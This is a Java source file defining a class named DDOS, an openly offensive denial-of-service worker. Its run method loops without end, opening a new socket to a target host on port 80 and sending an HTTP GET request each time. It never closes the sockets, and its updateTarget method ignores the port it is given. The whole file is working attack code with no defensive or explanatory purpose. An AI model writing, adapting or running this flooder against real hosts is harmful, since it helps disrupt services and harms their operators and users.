/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package com.trediecto;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;

/**
 *
 * @author TE10ZoOs
 */
public class DDOS implements Runnable
{
    public int port = 80;
    public String host = "";
    private BufferedWriter writer;
    
    
    public void sendRawLine(String line) throws IOException {
        writer.write(line + "\r\n");
        writer.flush();
    }
    public void updateTarget(String Host, int Port)
    {
        this.port = 80;
        this.host = Host;
    }

    @Override
    public void run()
    {
        
        while (true)
        {
            try
            {
                Socket net = new Socket(host, port);
                writer = new BufferedWriter(new OutputStreamWriter(net.getOutputStream()));
                sendRawLine("GET / HTTP/1.1");
                sendRawLine("Host: " + host);
                sendRawLine("Connection: close");
            }
            catch (Exception e)
            {
                CConsole.Print(e.getMessage());
            }
        }
        
    }
    
    
}
